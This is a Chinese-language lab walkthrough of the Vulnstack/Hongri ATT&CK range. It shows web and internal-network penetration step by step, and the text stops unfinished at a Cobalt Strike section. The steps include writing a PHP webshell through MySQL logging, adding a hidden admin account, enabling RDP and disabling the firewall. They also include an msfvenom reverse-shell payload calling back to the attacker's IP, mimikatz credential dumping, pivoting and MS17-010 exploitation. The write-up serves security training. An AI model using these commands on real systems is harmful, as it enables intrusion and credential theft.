# Vulnstack-ATT&CK(一)


Vulnstack-ATT&CK(一) 

<!--more-->

# 0x1前言

红日靶场
http://vulnstack.qiyuanxuetang.net/vuln/detail/2/
靶机初始密码 均为 hongrisec@2019

# 0x2环境搭建

| **攻击机**    | **kali**    | **ip** | **192.168.157.137** |                    |
| ------------- | ----------- | ------ | ------------------- | ------------------ |
| **web服务器** | **win7**    | **ip** | **192.168.157.153** | **192.168.52.143** |
| **域成员**    | **win2003** | **ip** | ****                | **192.168.52.141** |
| **域控**      | **win2008** | **ip** | ****                | **192.168.52.138** |

​	靶场提供的三个主机在同一个网段中，另外Win7主机有两张网卡，模拟可以与外网进行通信的主机，且安装有phpstudy，部署了web网站。

​	我们在使用VMware设置环境时，为了安全，应该设置两个网段，即新建两个VMnet，均为主机模型（这里是为了防止虚拟机上有什么病毒逃逸到自己的本机电脑上或者在操作过程中有什么错误，感染自己的电脑）。

![image-20230515211401416](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515211401416.png)

​	在VMware中，需要设置一下虚拟网络编辑器，确保其中有两个仅主机模式的VMnet，其中一个VMnet的子网地址设置为192.168.52.0，命名为VMnet19，为靶场网络，对Win server2003和Win server2008均配置静态IP，且属于192.168.52.0/24网段。攻击机kali所用的网卡名为VMnet19，网络地址设置为192.168.60.0。win7配置了VMnet19和VMnet18双网卡。

# 0x3web渗透

## 1.信息收集

### 探测内网存活

```
netdiscover -i eth0 -r 192.168.60.0/24
```

![image-20230515213842827](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515213842827.png)

目标靶机ip为192.168.60.128

(254是DHCP服务器地址)

### 端口扫描&及目录爆破

```
nmap 192.168.60.130
```

（启用了DHCP服务，重启后ip发生变化）

这是一般情况下的扫描结果，只能探测到80和3306端口

![image-20230515230426682](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230426682.png)

下面是将win7靶机的防火墙全部关掉的扫描结果，爆出了更多的端口

> ![image-20230515230125355](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230125355.png)
>
> 进一步探测
>
> ```
> nmap -sC -sV -Pn -p 1-65535 192.168.60.130
> ```
>
> ![image-20230515230000107](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230000107.png)

常用扫描工具有：**dirsearch、dirmap、御剑**，kali自带的**dirbuster、nikto**，使用多个扫描工具进行探测，可能会发现不同的扫描结果。

开启了80端口，我们可以访问一下
![image-20230515230924676](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515230924676.png)

页面下方有sql连接测试的接口，尝试phpstudy的默认账密root/root，连接成功

![image-20230515231546304](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231546304.png)

御剑爆网站目录
![image-20230515232024368](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515232024368.png)

dirsearch爆网站目录
![image-20230515232210882](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515232210882.png)

扫描工具很多，能不能扫出有用信息还是看字典是否强大。

另外我们还可以通过nikto扫描来获取相关信息

```
nikto -h 192.168.60.130
```

![image-20230515231226002](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231226002.png)

发现后台页面路径

![image-20230515231400157](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231400157.png)

![image-20230515231423904](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231423904.png)

尝试root/root也能登上

![image-20230515231724831](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515231724831.png)

## 2.利用sql写文件getshell

一般**利用mysql获取shell的方法**有以下几种：

1. select '一句话木马' into dumpfile/outfile '绝对路径'

2. 1. 条件1：secure_file_priv变量非NULL，表示支持数据导入导出
   2. 条件2：用户拥有root权限
   3. 条件3：知道当前网站的绝对路径

3. 利用日志文件

### 判断步骤如下：

查看secure-file-priv值，为NULL时表示禁止导入导出，且无法通过sql语句对该属性值进行修改，说明第1种方式行不通

我们可以通过以下sql语句进行查询

```
show variables like "%secure%";
```

![image-20230515233051860](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515233051860.png)

可见secure_file_priv的值为null，要想修改 Value值 只能修改配置文件 mysql.ini(linux修改配置文件：my.cnf)，所以第一种方法行不通

查看是否开启日志记录以及日志保存目录

```
SHOW VARIABLES LIKE '%general_log%'
```

![image-20230515233550682](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515233550682.png)

为OFF，但可使用SET语句设置为ON

```
set global general_log ="on";
```

![image-20230515234233335](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515234233335.png)

并将日志保存路径设置为php文件

```
set global general_log_file="C:/phpStudy/www/1.php";
```

再执行一条一句话木马语句，该语句会被记录到日志文件中

```
select '<?php eval($_POST["cmd"]);?>';
```

![image-20230515234455228](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515234455228.png)

此时，我们已经成功将一句话木马写入主机，然后就可以使用蚁剑或菜刀进行连接，成功getshell

![image-20230515235149545](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230515235149545.png)

### 另外我们也可以通过扫描到的cms管理页面进行getshell(账密网站页面直接写了)

![image-20230516000201759](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000201759.png)



![image-20230516000418970](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000418970.png)

登录后可对网站整体内容进行管理，其中可以对模板文件进行编辑，这样就可以向模板文件中增加一句话木马进行连接来getshell。

![image-20230516000724567](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000724567.png)

![image-20230516000736951](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516000736951.png)

直接用蚁剑连就可以了

同时该cms还存在xss、sql注入等漏洞，但利用价值不大

## 3.(拿下webshell后信息收集)内网信息收集

到目前为止，相当于我们已经获取了Win7的控制权，如果想进一步对内网段中其他主机的控制权，便需要进一步收集信息。例如，网段名、域用户、域控IP、管理员信息等等。而内网渗透的终极目标就是控制域控服务器，进而控制整个内网段。

**内网信息收集可以考虑以下几种方式：**

1.直接在蚁剑中打开终端执行命令-->相当于是在win7的终端上执行各种命令

2.利用蚁剑上传msf反弹木马，执行后反弹shell到msf，在msf中执行命令-->可以利用msf封装的其他命令，但该工具的优点在于一台机器的不断渗透，缺点是有点不稳定，容易掉线。

3.利用蚁剑上传CS反弹木马，执行后反弹shell到CS，然后在CS中执行命令-->可以利用CS提供的其他命令，能较方便的获取同内网其他主机的信息，并获取其他主机的控制权，但是命令执行后的结果返回特别慢，所以如果仅仅是执行一些收集主机信息的命令，建议不要用CS。

### 基本信息收集

常用命令：

```
ipconfig /all   查看本机ip，所在域
route print     打印路由信息
net view        查看局域网内其他主机名
arp -a          查看arp缓存
net start       查看开启了哪些服务
net share       查看开启了哪些共享
net share ipc$  开启ipc共享
net share c$    开启c盘共享
net use \\192.168.xx.xx\ipc$ "" /user:""   与192.168.xx.xx建立空连接
net use \\192.168.xx.xx\c$ "密码" /user:"用户名"  建立c盘共享
dir \\192.168.xx.xx\c$\user    查看192.168.xx.xx c盘user目录下的文件
net config Workstation   查看计算机名、全名、用户名、系统版本、工作站、域、登录域
net user                 查看本机用户列表
net user /domain         查看域用户
net localgroup administrators   查看本地管理员组（通常会有域用户）
net view /domain         查看有几个域
net user 用户名 /domain   获取指定域用户的信息
net group /domain        查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
net group 组名 /domain    查看域中某工作组
net group "domain admins" /domain  查看域管理员的名字
net group "domain computers" /domain  查看域中的其他主机名
net group "doamin controllers" /domain  查看域控制器（可能有多台）

netstat -ano | find "3389"   查看3389端口是否开启，若开启可以尝试远程桌面登录（Windows）
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  用于开启远程桌面登录
尝试远程桌面登录
```

### 尝试远程桌面登录

**判断3389端口是否开放**

```text
netstat -ano| find "3389"
```

![image-20230516111958296](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516111958296.png)

在蚁剑shell执行，发现并没有，这里猜测是被防火墙屏蔽了

在蚁剑shell输入一下命令，尝试开放3389端口

```text
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

![image-20230516113222692](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516113222692.png)

新建用户名，并添加到管理员组

```text
net user    查看用户账号名
net user username password /add   新建用户
net localgroup administrators username /add 将新用户添加到管理员组
```

![image-20230516113550048](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516113550048.png)

ps：要注意这里新建用户时，新用户的密码有强度限制，如果设置的太简单将无法添加。

![image-20230516114007149](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516114007149.png)

rdp连不上，可能是被防火墙屏蔽了

关闭防火墙

```
netsh advfirewall set allprofiles state off
```

![image-20230516134541354](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516134541354.png)

随后就可以连接了

# 0x4后渗透

## msf上线

这里的思路是将shell派送给CS或者msf进行下一步渗透。
使用msf生成exe并开启监听(也可以用cs生产exe)：

```
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.126.129 LPORT=2333 -f exe -o /root/run.exe
```

**tips：**这边的locaohost(lhost)是攻击机kali的ip地址，千万不要填成靶机ip

![image-20230516121349150](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121349150.png)

通过蚁剑上传并执行
![image-20230516115437667](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516115437667.png)

在shell里执行run.exe

![image-20230516115523188](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516115523188.png)

在kali中进入msf相关模块:

```
msfconsole
use multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set lhost 192.168.126.129
set lport 2333
exploit -j(后台)允许
```

![image-20230516121146493](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121146493.png)

随后通过`sessions`命令来查看反弹回来的shell
![image-20230516121300186](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516121300186.png)

随后`sessions -i 1`进入这个session

![image-20230516133857717](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516133857717.png)

### 提权system：

这里已经是system权限了，如果是administrator的话，需要先提权`getsystem`

> 一般提权流程：
>
> ```
> sysinfo
> getuid  (发现是administor权限)
> getsystem (获取system权限)
> ```

随后获取账号密码：

```
run hashdump
```

不知道为啥我除了一堆报错

除了hashdump，msf提供了一个用来获取域内用户hash的脚本，执行以下代码：

```
run post/windows/gather/smart_hashdump
```

![image-20230516140936257](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516140936257.png)

然后把mimikatz上传到靶机

```
upload /root/mimikatz.exe C:\\
//然后进入靶机的shell，运行mimikatz
```

![image-20230516141908799](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516141908799.png)

对mimikatz进行提权

```
privilege::debug
```

### 抓取密码

```
sekurlsa::logonPasswords
```

![image-20230516142417861](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516142417861.png)

看了其他大佬的博客，发现有更方便的方法：

> 1.导入账号密码hash值：
>
> ```
> run hashdump
> ```
>
> 2.mimikatz
>
> 加载mimikatz模块，加载模块前需要先将meterpreter迁移到64位的进程(需要system权限)：
>
> ```
> ps
> ```
>
> ![image-20230516201719751](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516201719751.png)
>
> ```
> migrate PID
> load mimikatz
> mimikatz_command -f sekurlsa::searchPasswords
> ```
>
> ![image-20230516202510583](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516202510583.png)
>
> 3.kiwi
>
> ```
> load wiki
> creds_all
> ```
>
> ![image-20230516202325608](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516202325608.png)
>
> 

### 开启3389

```
run post/windows/manage/enable_rdp
```

### 内网搜集

```
ipconfig
```

看到win7的另一个网卡的ip

![image-20230516203830987](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516203830987.png)

(中文字符编码问题出现的乱码，将就看吧)

```
//解决乱码问题
chcp 65001
```

使用`ipconfig /all`查看DNS服务器，推测DNS服务器名为god.org：

![image-20230516204144471](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516204144471.png)

查看域信息：`net view`

查看主域信息：`net view /domain`

![image-20230516204606672](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516204606672.png)

# 0x5横向渗透

## 添加路由

查看路由信息，添加路由到目标网络，以此使得MSF能够通过Win7路由转发访问,使得msf命令能够通过win7 访问到内网

查看目标机器所在内网网端信息与公网网端信息：

```
run get_local_subnets
```

![image-20230516205226856](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205226856.png)

添加内网路由 使得msf6能通过win7路由转发访问内网192.168.52.0/24网段：

```
run autoroute -s 192.168.52.0/24
```

![image-20230516205335183](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205335183.png)

## 扫描192.168.52.0/24网段：

```
run post/windows/gather/arp_scanner RHOSTS=192.168.52.0/24
```

![image-20230516205733104](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516205733104.png)

## 扫描存活主机:

先从win7的meterpreter session中退出来，执行：

```
use auxiliary/scanner/netbios/nbname
set rhosts 192.168.52.130
run
```

![image-20230516210721229](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516210721229.png)

## 内网端口信息：

```
use auxiliary/scanner/portscan/tcp
```

![image-20230516211132837](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211132837.png)

## 挂socks4a代理

挂代理是为了让其他工具能够通过win7 ，去访问192.168.52.0/24 网段

配置msf代理：

```
use auxiliary/server/socks_proxy
```

```
show options
set version 4a
```

![image-20230516211420178](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211420178.png)

```
show options
set srvport 1080
run
```

![image-20230516211601202](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211601202.png)

如果proxychains配置终端代理出现问题 修改一下文件`/etc/proxychains4.config`

再开一个终端nano编辑proxychains4.config，把端口改成1080，记得用root身份

![image-20230516211944344](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516211944344.png)

设置代理成功后 使用其他工具时需要添加`proxychains`

## 渗透win2003(远程登录)

### 信息收集

扫描主机版本

```
use auxiliary/scanner/smb/smb_version
```

```
set rhosts 192.168.52.141
run
```

![image-20230516213943669](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516213943669.png)

(emm，一开始没看到141就把前几个都扫了一遍。。。。)

Nmap扫描 192.168.52.141

```
proxychains nmap -Pn -sT 192.168.52.141
```

![image-20230516212409997](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516212409997.png)

### 尝试攻击

由nmap看到开放445端口
尝试永恒之蓝攻击win2003

```
use exploit/windows/smb/ms17_010_psexec
```

```
set payload windows/meterpreter/bind_tcp
set rhosts 192.168.52.141
run
```

![image-20230516221804853](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516221804853.png)    

经过了几次尝试，没有打下来

![image-20230516222729801](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516222729801.png)

可以尝试执行一些系统权限命令，比如添加管理员账户尝试3389登录

```
use auxiliary/admin/smb/ms17_010_command
show options
set rhosts 192.168.52.141
//添加用户
set command net user kun hongrisec@2019 /add
```

![image-20230516223044761](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516223044761.png)

```
//提升管理员权限
set command net localgroup administrators kun /add
run
//开启3389端口
set command 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'
run
```

然后使用proxychains4连接win2003的3389(kun用户登录)

![image-20230516232345980](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230516232345980.png)

。。。。。。。。。。

没搞完，先搁着吧



​                                                                                                                                                                                                                                                         

# msf联动cobaltstrike

msf获取到shell后，可以派发给cobaltstrike

首先cobaltstrike创建监听器：
